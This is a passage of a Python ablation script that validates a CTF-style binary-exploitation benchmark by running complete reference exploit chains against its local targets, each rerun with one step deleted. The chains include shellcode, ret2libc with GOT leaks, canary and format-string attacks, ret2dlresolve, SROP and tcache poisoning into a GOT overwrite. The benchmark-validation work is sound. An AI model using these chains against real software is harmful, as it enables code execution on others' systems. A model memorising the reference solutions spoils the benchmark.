#!/usr/bin/env python3
"""Ablation suite for the round-1 benchmark corpus.

Benign-input controls (benchmark/soundness_probes/negative_control_sweep.py)
answer "is this target *trivially* solvable?". They caught two void targets
(13_off_by_one, 11_heap_uaf_leak). They cannot catch a subtler defect: a target
whose intended chain contains a step that turns out **not to be required**, so
the target silently measures something easier than its label claims.

This suite answers the stronger question: **is every step of the intended chain
actually necessary?** For each target it runs the verified reference chain with
exactly one step deleted or neutered and asserts the flag does *not* appear.

Method (the part that makes the result mean anything)
-----------------------------------------------------
1. Each target is rebuilt with a **fresh random secret** via the harness's own
   `run_bench.build_with_secret()`, so no result can come from a stale or
   predictable flag constant.
2. Every target has ONE parametrised chain function. The positive control is
   that function with all steps intact; each ablation is the SAME function with
   one keyword flipped. So a `BLOCKED` verdict cannot be an artifact of broken
   harness code -- if the code were broken, the positive control would fail too
   and the target is reported SETUP_FAILED rather than passing silently.
3. Every byte the target ever emits is accumulated (see `Rec`), so the flag
   cannot be missed just because it appeared in an earlier read.

Verdicts
--------
  BLOCKED               flag absent with the step removed -> the step is load-bearing
  *** NOT BLOCKED ***   flag STILL appears with the step removed -> the target
                        does not measure that step; if the removed step is the
                        technique itself, the target is measuring less than it
                        claims and needs the 11/13 VOID decision
  RELAXATION            a deliberately-expected NOT-BLOCKED probe: a documented
                        detail that is NOT in fact required. Not a defect on its
                        own -- recorded for honesty about what the target pins
                        down. Flagged if it turns out to be blocked after all.

Usage
-----
    python3 benchmark/ablation/ablate.py                        # all 13 targets
    python3 benchmark/ablation/ablate.py --case 04 --case 12    # a subset
    python3 benchmark/ablation/ablate.py --list                 # list the cases
    python3 benchmark/ablation/ablate.py --no-rebuild           # keep current flags

Paths resolve from this file's own location, so it runs from any working
directory (including by absolute path from `/`). `--corpus-root` /
`--manifest` override them for later rounds.

Exit status 0 means every ablation FAILED to produce the flag -- that is the
passing result. 1 means a chain step turned out to be unnecessary, i.e. a corpus
defect. 2 means the run could not measure something and so is not a clean bill of
health: unbuilt corpus, missing flag.txt, bad --corpus-root, a failed positive
control, or a target whose discovery step did not resolve.

Out of scope: 11_heap_uaf_leak and 13_off_by_one are VOID (the flag is reachable
by ordinary benign input, with no exploitation at all), so there is no chain
whose steps could be meaningfully ablated.
"""
import argparse
import os
import sys
import time
import warnings
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable

os.environ.setdefault("TERM", "xterm")
warnings.filterwarnings("ignore")

BENCH = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(BENCH))
import run_bench as rb  # noqa: E402

from pwn import (ELF, ROP, SigreturnFrame, asm, constants, context,  # noqa: E402
                 p64, process, shellcraft, u64)
from pwnlib.rop.ret2dlresolve import Ret2dlresolvePayload  # noqa: E402

context.clear(arch="amd64", os="linux", log_level="error")

IO_TIMEOUT = 3.0


# --------------------------------------------------------------------------- #
# plumbing
# --------------------------------------------------------------------------- #
class Rec:
    """Tube wrapper that remembers everything the target emitted.

    An ablation must not be scored BLOCKED merely because the flag scrolled past
    in an earlier read, so every byte received is accumulated.
    """

    def __init__(self, p):
        self.p = p
        self.seen = bytearray()

    def _keep(self, data: bytes) -> bytes:
        self.seen += data
        return data

    def recvuntil(self, delim, **kw):
        kw.setdefault("timeout", IO_TIMEOUT)
        return self._keep(self.p.recvuntil(delim, **kw))

    def recvline(self, **kw):
        kw.setdefault("timeout", IO_TIMEOUT)
        return self._keep(self.p.recvline(**kw))

    def recvn(self, n, **kw):
        kw.setdefault("timeout", IO_TIMEOUT)
        return self._keep(self.p.recvn(n, **kw))

    def recv(self, n, **kw):
        kw.setdefault("timeout", IO_TIMEOUT)
        return self._keep(self.p.recv(n, **kw))

    def recvrepeat(self, t=IO_TIMEOUT):
        return self._keep(self.p.recvrepeat(t))

    def send(self, data):
        self.p.send(data)

    def sendline(self, data):
        self.p.sendline(data)

    def close(self):
        try:
            self.p.close()
        except Exception:
            pass


@dataclass
class Target:
    """One corpus target, freshly built with a secret flag."""
    slug: str
    binary: str
    target_dir: str
    flag: bytes

    def elf(self) -> ELF:
        return ELF(self.binary, checksec=False)

    def proc(self) -> Rec:
        return Rec(process(self.binary, cwd=self.target_dir))


def finish(r: Rec) -> bytes:
    """Drain whatever is left and return everything the target ever emitted."""
    try:
        r.recvrepeat(IO_TIMEOUT)
    except Exception:
        pass
    r.close()
    return bytes(r.seen)


def run_chain(fn: Callable, t: Target, kw: dict) -> tuple[bytes, str]:
    """Run a chain variant. A crash/EOF is a legitimate outcome, not an error:
    'the exploit stopped working' is exactly what an ablation should produce."""
    r = None
    try:
        r = fn(t, **kw)
        return finish(r), ""
    except Exception as e:  # EOFError, timeout, parse failure on a dead process
        out = finish(r) if isinstance(r, Rec) else b""
        return out, f"{type(e).__name__}: {str(e)[:90]}"


@dataclass
class Case:
    name: str
    why: str
    kw: dict = field(default_factory=dict)
    # False == "I expect the flag to STILL appear"; a documented detail that is
    # not actually load-bearing. Recorded honestly rather than hidden.
    expect_blocked: bool = True


# --------------------------------------------------------------------------- #
# 01_shellcode_stack -- stack shellcode on a non-executable-stack-free binary
# --------------------------------------------------------------------------- #
def chain_01(t, *, use_leak=True, overwrite_rip=True, include_shellcode=True,
             post_rip=True):
    OFFSET = 72
    sc = asm(shellcraft.amd64.linux.sh())
    r = t.proc()
    r.recvuntil(b"buf @ ")
    buf = int(r.recvline().strip(), 16)
    if not use_leak:
        # Structurally identical, but a guessed stack address. ASLR moves buf
        # every run, so this is what "skip the leak" actually costs.
        buf = 0x7FFD_0000_0000
    r.recvuntil(b"shellcode> ")

    if not overwrite_rip:
        payload = sc.ljust(64, b"\x90")            # shellcode present, RIP intact
    elif not include_shellcode:
        payload = b"A" * OFFSET + p64(buf + OFFSET + 8)
    elif post_rip:
        payload = b"A" * OFFSET + p64(buf + OFFSET + 8) + sc
    else:
        # shellcode inside the buffer instead of past the saved RIP: its own
        # pushes walk back over it (the corpus's documented trap)
        payload = sc.ljust(OFFSET, b"\x90") + p64(buf)
    r.send(payload)
    time.sleep(0.3)
    r.sendline(b"cat flag.txt")
    return r


CASES_01 = [
    Case("no_shellcode", "return address set, but no shellcode written",
         {"include_shellcode": False}),
    Case("no_rip_overwrite", "shellcode written into buf, saved RIP left alone",
         {"overwrite_rip": False}),
    Case("no_stack_leak", "same payload shape, guessed stack address (no leak)",
         {"use_leak": False}),
    Case("shellcode_in_buffer", "shellcode before the saved RIP instead of after",
         {"post_rip": False}),
]


# --------------------------------------------------------------------------- #
# 02_ret2plt_system -- ret2plt, no leak needed
# --------------------------------------------------------------------------- #
def chain_02(t, *, align_ret=True, set_rdi=True, call_system=True,
             correct_binsh=True):
    OFFSET = 72
    elf = t.elf()
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret = rop.find_gadget(["ret"])[0]
    binsh = next(elf.search(b"/bin/sh\x00"))
    if not correct_binsh:
        binsh = next(elf.search(b"Input: "))   # a real string, just not a shell
    words = []
    if align_ret:
        words.append(ret)
    if set_rdi:
        words += [pop_rdi, binsh]
    if call_system:
        words.append(elf.plt["system"])
    r = t.proc()
    r.recvuntil(b"Input: ")
    r.send(b"A" * OFFSET + b"".join(p64(x) for x in words))
    time.sleep(0.3)
    r.sendline(b"cat flag.txt")
    return r


CASES_02 = [
    Case("no_alignment_ret", "drop the 16-byte stack-alignment ret -> movaps in do_system",
         {"align_ret": False}),
    Case("no_rdi_setup", "call system() without loading rdi",
         {"set_rdi": False}),
    Case("no_system_call", "set rdi to /bin/sh but never call system()",
         {"call_system": False}),
    Case("wrong_rdi_string", "call system() with a non-shell string pointer",
         {"correct_binsh": False}),
]


# --------------------------------------------------------------------------- #
# 03_pie_leak_ret2libc -- PIE leak -> GOT leak -> ret2libc
# --------------------------------------------------------------------------- #
def chain_03(t, *, rebase_pie=True, use_libc_leak=True, reentry_ret=True,
             align_ret=True, final_system=True):
    OFFSET = 72
    elf = t.elf()
    libc = ELF(elf.libc.path, checksec=False)

    r = t.proc()
    r.recvuntil(b"Leak: ")
    vuln_runtime = int(r.recvline().strip(), 16)
    base = vuln_runtime - elf.symbols["vuln"]

    elf.address = base
    rop = ROP(elf)
    addrs = {
        "pop_rdi": rop.find_gadget(["pop rdi", "ret"])[0],
        "ret": rop.find_gadget(["ret"])[0],
        "puts_got": elf.got["puts"],
        "puts_plt": elf.plt["puts"],
        "vuln": elf.symbols["vuln"],
    }
    if not rebase_pie:
        # the leak was taken but never applied: link-time addresses
        addrs = {k: v - base for k, v in addrs.items()}

    r.recvuntil(b"Input: ")
    leak_chain = [addrs["ret"], addrs["pop_rdi"], addrs["puts_got"],
                  addrs["puts_plt"]]
    if reentry_ret:
        leak_chain.append(addrs["ret"])   # re-entry stack-parity fixer
    leak_chain.append(addrs["vuln"])
    r.send(b"A" * OFFSET + b"".join(p64(x) for x in leak_chain))

    puts_addr = u64(r.recv(6).ljust(8, b"\x00"))
    libc.address = (puts_addr - libc.symbols["puts"]) if use_libc_leak else 0

    if not final_system:
        return r

    r.recvuntil(b"Leak: ")
    r.recvline()
    r.recvuntil(b"Input: ")
    words = []
    if align_ret:
        words.append(addrs["ret"])
    words += [addrs["pop_rdi"], next(libc.search(b"/bin/sh\x00")),
              libc.symbols["system"]]
    r.send(b"A" * OFFSET + b"".join(p64(x) for x in words))
    time.sleep(0.3)
    r.sendline(b"cat flag.txt")
    return r


CASES_03 = [
    Case("pie_leak_not_applied", "take the %p leak but never rebase gadgets on it",
         {"rebase_pie": False}),
    Case("libc_leak_not_applied", "leak puts@got but compute system() without the base",
         {"use_libc_leak": False}),
    Case("no_reentry_ret", "drop the parity ret before returning into vuln()",
         {"reentry_ret": False}),
    Case("no_alignment_ret", "drop the 16-byte alignment ret in the final round",
         {"align_ret": False}),
    Case("leaks_only", "do both leaks, never call system()",
         {"final_system": False}),
]


# --------------------------------------------------------------------------- #
# 04_canary_leak_bypass -- canary disclosed by a raw over-read
# --------------------------------------------------------------------------- #
def chain_04(t, *, use_leaked_canary=True, do_overflow=True, target_win=True,
             stage1_len=72):
    BUF, RIP_OFF = 72, 88  # sizeof(buf) == canary offset; buf -> saved RIP
    elf = t.elf()
    win = elf.symbols["win"]

    r = t.proc()
    r.recvuntil(b"Name: ")
    r.send(b"B" * stage1_len)
    r.recvuntil(b"Hello: ")
    echo = r.recvn(BUF + 8)
    canary = u64(echo[BUF:BUF + 8])
    if not use_leaked_canary:
        canary = 0xDEAD_BEEF_DEAD_BE00      # canary-shaped, but not this process's
    if not do_overflow:
        return r

    ret_to = win if target_win else 0x4141_4141_4141_4141
    r.recvuntil(b"Message: ")
    payload = b"C" * BUF + p64(canary) + b"D" * 8 + p64(ret_to)
    assert len(payload) == RIP_OFF + 8
    r.send(payload)
    return r


CASES_04 = [
    Case("canary_not_leaked", "overflow with a canary-shaped guess instead of the leak",
         {"use_leaked_canary": False}),
    Case("leak_only", "leak the canary, never overflow",
         {"do_overflow": False}),
    Case("wrong_return_target", "restore the canary but return somewhere other than win()",
         {"target_win": False}),
    Case("short_stage1_write", "send 8 bytes instead of filling buf before the echo",
         {"stage1_len": 8}, expect_blocked=False),
]


# --------------------------------------------------------------------------- #
# 05_fmtstr_arbread -- format-string canary leak
# --------------------------------------------------------------------------- #
def _fmt05_probe(t, idx: int):
    """Leak %idx$p and return (value, Rec) with the process still at Message:."""
    r = t.proc()
    r.recvuntil(b"Name: ")
    r.send(b"%%%d$p" % idx)
    printed = r.recvuntil(b"\nMessage: ").split(b"\n")[0].strip()
    return (int(printed, 16) if printed.startswith(b"0x") else None), r


def _looks_like_canary(v) -> bool:
    return v is not None and v != 0 and (v & 0xFF) == 0 and v > 0xFFFFFFFF


def find_canary_index(t) -> int:
    """Sweep %N$p and return the index a real solve would settle on: the first
    canary-shaped value that actually makes the overflow work."""
    for idx in range(6, 40):
        value, r = _fmt05_probe(t, idx)
        try:
            if not _looks_like_canary(value):
                continue
            win = t.elf().symbols["win"]
            r.send(b"A" * 72 + p64(value) + b"B" * 8 + p64(win))
            if t.flag in finish(r):
                return idx
        finally:
            r.close()
    raise RuntimeError("no confirmed canary index in %6$..%39$")


def chain_05(t, *, index=None, leak_canary=True, do_overflow=True,
             target_win=True):
    BUF_TO_CANARY, BUF_TO_RIP = 72, 88
    elf = t.elf()
    win = elf.symbols["win"]
    idx = index if index is not None else t.notes["canary_index"]

    value, r = _fmt05_probe(t, idx)
    if leak_canary and value is None:
        raise RuntimeError(f"%{idx}$p printed no hex value to use as a canary")
    canary = value if leak_canary else 0xDEAD_BEEF_DEAD_BE00
    if not do_overflow:
        return r
    ret_to = win if target_win else 0x4141_4141_4141_4141
    payload = b"A" * BUF_TO_CANARY + p64(canary) + b"B" * 8 + p64(ret_to)
    assert len(payload) == BUF_TO_RIP + 8
    r.send(payload)
    return r


CASES_05 = [
    Case("canary_not_leaked", "overflow with a canary-shaped guess, no format-string read",
         {"leak_canary": False}),
    # NOT a defect, and a correction to this corpus's own difficulty note:
    # the canary is per-THREAD (%fs:0x28), stamped identically into every frame,
    # so main's copy at %29$p is not a decoy -- it is the same 8 bytes. Measured
    # byte-identical to %25$p on every run. Frame attribution is therefore not a
    # step a solver has to get right; recognising canary-vs-pointer is.
    Case("wrong_index_main_canary", "read main's canary copy at %29$p instead of vuln's",
         {"index": 29}, expect_blocked=False),
    Case("wrong_index_decoy_ptr", "read %13$p -- a libc pointer that also ends in 0x00",
         {"index": 13}),
    Case("leak_only", "leak the canary, never overflow",
         {"do_overflow": False}),
]


# --------------------------------------------------------------------------- #
# 06_fmtstr_arbwrite -- %n write to a global
# --------------------------------------------------------------------------- #
def chain_06(t, *, do_write=True, pad_before=True, addr_first=False,
             correct_addr=True):
    r = t.proc()
    r.recvuntil(b"unlocked @ ")
    unlocked = int(r.recvline().strip(), 16)
    addr = unlocked if correct_addr else unlocked + 8
    addr_idx = t.notes["buf_index"] + 1
    directive = b"%%%d$n" % addr_idx

    r.recvuntil(b"Message: ")
    if not do_write:
        payload = b"hello there"                       # ordinary benign input
    elif addr_first:
        payload = p64(addr) + directive                # NUL stops printf parsing
    elif not pad_before:
        payload = directive.ljust(8, b"A") + p64(addr)  # %n writes 0
    else:
        payload = b"A" * (8 - len(directive)) + directive + p64(addr)
    r.send(payload)
    return r


def find_buf_index(t) -> int:
    marker = b"BBBBBBBB"
    probe_range = range(6, 20)
    r = t.proc()
    try:
        r.recvuntil(b"unlocked @ ")
        r.recvline()
        r.recvuntil(b"Message: ")
        r.send(marker + b"".join(b"%%%d$p|" % i for i in probe_range))
        # finish() returns everything the target emitted, banner included, so
        # match on containment rather than on an exact field value.
        out = finish(r)
        fields = out.split(b"|")
        for n, idx in enumerate(probe_range):
            if n < len(fields) and b"0x4242424242424242" in fields[n]:
                return idx
        raise RuntimeError(f"marker not found: {out!r}")
    finally:
        r.close()


CASES_06 = [
    Case("no_format_write", "send ordinary text -- no %n at all",
         {"do_write": False}),
    Case("no_padding_before_n", "%n first, padding after -> writes 0, not 3",
         {"pad_before": False}),
    Case("address_before_directive", "address first -> its NUL bytes stop printf parsing",
         {"addr_first": True}),
    Case("wrong_target_address", "%n writes to &unlocked+8 instead of &unlocked",
         {"correct_addr": False}),
]


# --------------------------------------------------------------------------- #
# 07_ret2libc_leak -- GOT leak -> ret2libc
# --------------------------------------------------------------------------- #
def chain_07(t, *, use_leak=True, reentry_ret=True, align_ret=True,
             final_system=True):
    OFFSET = 72
    elf = t.elf()
    libc = ELF(elf.libc.path, checksec=False)
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret = rop.find_gadget(["ret"])[0]

    r = t.proc()
    r.recvuntil(b"Input: ")
    leak_chain = [ret, pop_rdi, elf.got["puts"], elf.plt["puts"]]
    if reentry_ret:
        leak_chain.append(ret)
    leak_chain.append(elf.symbols["vuln"])
    r.send(b"A" * OFFSET + b"".join(p64(x) for x in leak_chain))

    puts_addr = u64(r.recv(6).ljust(8, b"\x00"))
    libc.address = (puts_addr - libc.symbols["puts"]) if use_leak else 0
    if not final_system:
        return r

    r.recvuntil(b"Input: ")
    words = ([ret] if align_ret else []) + [
        pop_rdi, next(libc.search(b"/bin/sh\x00")), libc.symbols["system"]]
    r.send(b"A" * OFFSET + b"".join(p64(x) for x in words))
    time.sleep(0.3)
    r.sendline(b"cat flag.txt")
    return r


CASES_07 = [
    Case("leak_not_applied", "leak puts@got but compute system() without the libc base",
         {"use_leak": False}),
    Case("no_reentry_ret", "drop the parity ret before returning into vuln()",
         {"reentry_ret": False}),
    Case("no_alignment_ret", "drop the 16-byte alignment ret in round 2",
         {"align_ret": False}),
    Case("leak_only", "leak the libc base, never call system()",
         {"final_system": False}),
]


# --------------------------------------------------------------------------- #
# 08_ret2dlresolve -- forged relocation, no leak primitive at all
# --------------------------------------------------------------------------- #
def chain_08(t, *, send_forgery=True, do_resolve=True, correct_index=True,
             align_ret=True):
    OFFSET = 72
    elf = t.elf()
    dl = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
    if not correct_index:
        dl.reloc_index += 1              # forged reloc points at the wrong slot

    rop = ROP(elf)
    if align_ret:
        rop.raw(rop.find_gadget(["ret"])[0])
    rop.read(0, dl.data_addr, len(dl.payload))
    if do_resolve:
        rop.ret2dlresolve(dl)
    chain = rop.chain()

    r = t.proc()
    r.recvuntil(b"input> ")
    r.send(b"A" * OFFSET + chain)
    time.sleep(0.4)
    # The ROP-driven read() still happens; the ablation is whether what lands
    # there is the forged Elf64_Rela/Elf64_Sym blob or junk of the same length.
    r.send(dl.payload if send_forgery else b"A" * len(dl.payload))
    time.sleep(0.4)
    r.sendline(b"cat flag.txt")
    return r


CASES_08 = [
    Case("forgery_not_written", "write junk instead of the forged Elf64_Rela/Sym blob",
         {"send_forgery": False}),
    Case("no_dlresolve_call", "write the forgery but never enter PLT0 with the index",
         {"do_resolve": False}),
    Case("wrong_reloc_index", "resolve with reloc_index+1",
         {"correct_index": False}),
    Case("no_alignment_ret", "drop the 16-byte alignment ret",
         {"align_ret": False}),
]


# --------------------------------------------------------------------------- #
# 09_srop -- sigreturn-oriented programming
# --------------------------------------------------------------------------- #
def chain_09(t, *, trigger_sigreturn=True, include_frame=True,
             frame_execve=True, syscall_off=4):
    OFFSET = 72
    elf = t.elf()
    rop = ROP(elf)
    pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
    syscall = elf.symbols["gadget_syscall_ret"] + syscall_off
    binsh = next(elf.search(b"/bin/sh\x00"))

    frame = SigreturnFrame()
    frame.rax = constants.SYS_execve if frame_execve else 0
    frame.rdi = binsh
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall
    frame.rsp = elf.bss() + 0x800

    payload = b"A" * OFFSET
    if trigger_sigreturn:
        payload += p64(pop_rax) + p64(15)
    payload += p64(syscall)
    if include_frame:
        payload += bytes(frame)
    assert len(payload) <= 400

    r = t.proc()
    r.recvuntil(b"Input: ")
    r.send(payload)
    time.sleep(0.3)
    r.sendline(b"cat flag.txt")
    return r


CASES_09 = [
    Case("no_sigreturn_trigger", "syscall without setting rax=15 -> no sigreturn",
         {"trigger_sigreturn": False}),
    Case("no_frame", "trigger sigreturn with no SigreturnFrame on the stack",
         {"include_frame": False}),
    Case("frame_rax_not_execve", "frame.rax=0 (read) instead of 59 (execve)",
         {"frame_execve": False}),
    Case("syscall_at_symbol", "use the gadget symbol address, not symbol+4 (endbr64)",
         {"syscall_off": 0}, expect_blocked=False),
]


# --------------------------------------------------------------------------- #
# 10_int_overflow -- 8-bit truncation bypassing a signed length check
# --------------------------------------------------------------------------- #
def chain_10(t, *, length=-1, overwrite_rip=True, target_win=True):
    OFFSET = 88
    elf = t.elf()
    ret_to = elf.symbols["win"] if target_win else 0x4141_4141_4141_4141
    r = t.proc()
    r.recvuntil(b"Length: ")
    r.sendline(str(length).encode())
    r.recvuntil(b"Data: ")
    payload = b"A" * OFFSET + (p64(ret_to) if overwrite_rip else b"")
    r.send(payload)
    return r


CASES_10 = [
    Case("legal_length", "ask for 64 bytes -> read is capped, no overflow",
         {"length": 64}),
    Case("honest_oversize_length", "ask for 200 -> the signed check rejects it",
         {"length": 200}),
    Case("no_rip_overwrite", "truncation applied, but stop before the saved RIP",
         {"overwrite_rip": False}),
    Case("wrong_return_target", "overflow to a non-win() address",
         {"target_win": False}),
]


# --------------------------------------------------------------------------- #
# 12_heap_tcache_poison -- tcache poisoning -> GOT overwrite
# --------------------------------------------------------------------------- #
def _m12_create(r, idx, size):
    r.recvuntil(b"> ")
    r.sendline(b"1")
    r.recvuntil(b"index: ")
    r.sendline(str(idx).encode())
    r.recvuntil(b"size: ")
    r.sendline(str(size).encode())
    r.recvuntil(b"@ ")
    return int(r.recvline().strip(), 16)


def _m12_delete(r, idx):
    r.recvuntil(b"> ")
    r.sendline(b"2")
    r.recvuntil(b"index: ")
    r.sendline(str(idx).encode())


def _m12_edit(r, idx, data):
    r.recvuntil(b"> ")
    r.sendline(b"3")
    r.recvuntil(b"index: ")
    r.sendline(str(idx).encode())
    r.recvuntil(b"data: ")
    r.send(data)


def chain_12(t, *, mangle=True, align_target=True, poison_head=True,
             write_win=True, trigger_free=True):
    SIZE = 0x60
    elf = t.elf()
    win = elf.symbols["win"]
    free_got = elf.got["free"]
    target = (free_got & ~0xF) if align_target else free_got
    pad = free_got - target

    r = t.proc()
    chunk_a = _m12_create(r, 0, SIZE)
    chunk_b = _m12_create(r, 1, SIZE)
    _m12_delete(r, 0)          # tcache[0x70]: A
    _m12_delete(r, 1)          # tcache[0x70]: B -> A  (B is the head)

    # safe-linking: the stored next is (position >> 12) ^ target
    poison_idx = 1 if poison_head else 0
    pos = chunk_b if poison_head else chunk_a
    stored = ((pos >> 12) ^ target) if mangle else target
    _m12_edit(r, poison_idx, p64(stored))

    _m12_create(r, 2, SIZE)
    popped_2 = _m12_create(r, 3, SIZE)
    if popped_2 != target:
        return r               # redirect failed; nothing further is meaningful
    if write_win:
        _m12_edit(r, 3, b"\x00" * pad + p64(win))
    if trigger_free:
        _m12_delete(r, 2)      # free(B) dispatches through the poisoned GOT
    return r


CASES_12 = [
    Case("no_safe_linking_mangle", "store the raw target instead of PROTECT_PTR(pos, target)",
         {"mangle": False}),
    Case("unaligned_target", "aim the freelist at free@got directly (8-aligned)",
         {"align_target": False}),
    Case("poison_non_head_chunk", "corrupt chunk A's next instead of the list head B",
         {"poison_head": False}),
    Case("no_got_write", "win the allocation but never write win() over free@got",
         {"write_win": False}),
    Case("no_free_trigger", "write free@got but never call free() again",
         {"trigger_free": False}),
]


# --------------------------------------------------------------------------- #
# 14_negative_index -- unchecked lower bound
# --------------------------------------------------------------------------- #
def chain_14(t, *, idx=-1, val=0x1337):
    r = t.proc()
    r.recvuntil(b"index: ")
    r.sendline(str(idx).encode())
    r.recvuntil(b"value: ")
    r.sendline(str(val).encode())
    return r


CASES_14 = [
    Case("in_bounds_index", "write arr[0] -- an ordinary, in-bounds write",
         {"idx": 0}),
    Case("wrong_negative_index", "write arr[-2]; only arr[-1] aliases s.flag",
         {"idx": -2}),
    Case("wrong_value", "write arr[-1] = 1 instead of the compared 0x1337",
         {"val": 1}),
]


# --------------------------------------------------------------------------- #
# 15_win_function -- ret2win baseline
# --------------------------------------------------------------------------- #
def chain_15(t, *, offset=40, include_win=True):
    elf = t.elf()
    r = t.proc()
    r.recvuntil(b"Say something: ")
    payload = b"A" * offset + (p64(elf.symbols["win"]) if include_win else b"")
    r.send(payload)
    return r


CASES_15 = [
    Case("no_win_address", "overflow with padding only",
         {"include_win": False}),
    Case("offset_too_short", "&win 8 bytes early -> lands in the frame, not the saved RIP",
         {"offset": 32}),
    Case("offset_too_long", "&win 8 bytes late -> saved RIP stays 0x41414141...",
         {"offset": 48}),
]


# --------------------------------------------------------------------------- #
# registry
# --------------------------------------------------------------------------- #
@dataclass
class Suite:
    slug: str
    chain: Callable
    cases: list
    # per-target discovery a genuine solve also has to do (index sweeps etc.)
    prepare: Callable | None = None


SUITES = [
    Suite("01_shellcode_stack", chain_01, CASES_01),
    Suite("02_ret2plt_system", chain_02, CASES_02),
    Suite("03_pie_leak_ret2libc", chain_03, CASES_03),
    Suite("04_canary_leak_bypass", chain_04, CASES_04),
    Suite("05_fmtstr_arbread", chain_05, CASES_05,
          prepare=lambda t: {"canary_index": find_canary_index(t)}),
    Suite("06_fmtstr_arbwrite", chain_06, CASES_06,
          prepare=lambda t: {"buf_index": find_buf_index(t)}),
    Suite("07_ret2libc_leak", chain_07, CASES_07),
    Suite("08_ret2dlresolve", chain_08, CASES_08),
    Suite("09_srop", chain_09, CASES_09),
    Suite("10_int_overflow", chain_10, CASES_10),
    Suite("12_heap_tcache_poison", chain_12, CASES_12),
    Suite("14_negative_index", chain_14, CASES_14),
    Suite("15_win_function", chain_15, CASES_15),
]

VOID = {
    "11_heap_uaf_leak": "show(0) with no delete prints the flag from the live "
                        "chunk -- no UAF required, so no chain to ablate",
    "13_off_by_one": "any input >= 32 bytes triggers win() on the normal path",
}


def provision(corpus, slug: str, rebuild: bool) -> Target:
    """Give the target a fresh secret flag (or, with --no-rebuild, use whatever
    the corpus currently holds). Raises ProvisionError with a friendly message
    rather than a traceback."""
    if rebuild:
        rb.build_with_secret(corpus, slug, rb.mint_secret_flag())

    binary, flag_file = corpus.binary(slug), corpus.flag_file(slug)
    if not binary.is_file():
        raise rb.ProvisionError(
            f"{binary} is not built -- run benchmark/build_all.sh (or drop "
            f"--no-rebuild and let this script build it)")
    if not flag_file.is_file():
        raise rb.ProvisionError(
            f"{flag_file} is missing -- run benchmark/build_all.sh")
    flag = flag_file.read_text().strip()
    if not flag:
        raise rb.ProvisionError(f"{flag_file} is empty; nothing to check against")
    return Target(slug=slug, binary=str(binary),
                  target_dir=str(corpus.target_dir(slug)), flag=flag.encode())


def main() -> int:
    global IO_TIMEOUT
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--case", action="append", default=[], metavar="PREFIX",
                    help="only run targets starting with PREFIX "
                         "(repeatable, e.g. --case 04 --case 12)")
    ap.add_argument("--list", action="store_true", help="list cases and exit")
    ap.add_argument("--timeout", type=float, default=IO_TIMEOUT,
                    help="per-read timeout in seconds (default: %(default)s)")
    ap.add_argument("--no-rebuild", action="store_true",
                    help="use the corpus as it stands instead of rebuilding "
                         "each target with a fresh secret flag")
    ap.add_argument("--corpus-root", type=Path, default=rb.DEFAULT_CORPUS_DIR,
                    help="corpus directory (default: %(default)s)")
    ap.add_argument("--manifest", type=Path, default=rb.DEFAULT_CORPUS_YAML,
                    help="corpus manifest (default: %(default)s)")
    args = ap.parse_args()
    IO_TIMEOUT = args.timeout

    wanted = SUITES
    if args.case:
        wanted = [s for s in SUITES
                  if any(s.slug.startswith(p) or s.slug.split("_")[0] == p.zfill(2)
                         for p in args.case)]
        if not wanted:
            print(f"error: no target matched {args.case}", file=sys.stderr)
            return 2

    if args.list:
        for s in wanted:
            print(f"\n{s.slug}  ({len(s.cases)} ablations)")
            for c in s.cases:
                tag = "" if c.expect_blocked else "   [RELAXATION probe]"
                print(f"    {c.name:<28} {c.why}{tag}")
        total = sum(len(s.cases) for s in wanted)
        print(f"\n{total} ablations across {len(wanted)} targets")
        return 0

    if not args.corpus_root.is_dir():
        print(f"error: corpus root not found: {args.corpus_root}", file=sys.stderr)
        return 2
    if not args.manifest.is_file():
        print(f"error: corpus manifest not found: {args.manifest}", file=sys.stderr)
        return 2

    corpus = rb.Corpus(root=args.corpus_root.resolve(),
                       manifest=args.manifest.resolve())
    print(f"corpus: {corpus.root}")
    print("each target is rebuilt with a FRESH RANDOM secret before its cases"
          if not args.no_rebuild else
          "--no-rebuild: using the corpus and flag.txt as they stand")
    print()

    leaks, setup_failed, surprises, n_blocked = [], [], [], 0

    # Serialise against run_bench.py / the soundness probes: a rebuilding run
    # rewrites each target's binary and flag.txt as it goes.
    with rb.corpus_lock(corpus):
        for s in wanted:
            print(f"=== {s.slug} " + "=" * (60 - len(s.slug)))
            try:
                t = provision(corpus, s.slug, rebuild=not args.no_rebuild)
            except rb.ProvisionError as e:
                print(f"  NOT MEASURABLE: {str(e)[:150]}\n")
                setup_failed.append(s.slug)
                continue

            t.notes = {}
            if s.prepare:
                try:
                    t.notes = s.prepare(t)
                    print(f"  discovery: {t.notes}")
                except Exception as e:
                    print(f"  DISCOVERY FAILED: {type(e).__name__}: {e}\n")
                    setup_failed.append(s.slug)
                    continue

            # Positive control FIRST: without it, "BLOCKED" everywhere could
            # just mean this file is broken.
            out, err = run_chain(s.chain, t, {})
            if t.flag not in out:
                print(f"  POSITIVE CONTROL FAILED ({err or 'no flag'}) -- "
                      f"ablations for this target are not interpretable\n")
                setup_failed.append(s.slug)
                continue
            print("  positive control             intact chain -> FLAG (baseline ok)")

            for c in s.cases:
                out, err = run_chain(s.chain, t, c.kw)
                got = t.flag in out
                if got and c.expect_blocked:
                    verdict = "*** NOT BLOCKED -- FLAG STILL APPEARS ***"
                    leaks.append((s.slug, c))
                elif got:
                    verdict = "RELAXATION confirmed (flag still appears, as expected)"
                elif not c.expect_blocked:
                    verdict = "*** relaxation probe was BLOCKED (step matters) ***"
                    surprises.append((s.slug, c))
                else:
                    verdict = "no-flag (BLOCKED)"
                    n_blocked += 1
                note = f"  [{err}]" if err and not got else ""
                print(f"  {c.name:<28} {verdict}{note}")
            print()

    print("=" * 72)
    print(f"{n_blocked} strict ablations BLOCKED the flag as required")
    if leaks:
        print(f"\n*** {len(leaks)} ABLATION(S) STILL PRODUCED THE FLAG ***")
        print("These targets do not measure the step that was removed:")
        for slug, c in leaks:
            print(f"  {slug:<24} {c.name:<28} {c.why}")
    if surprises:
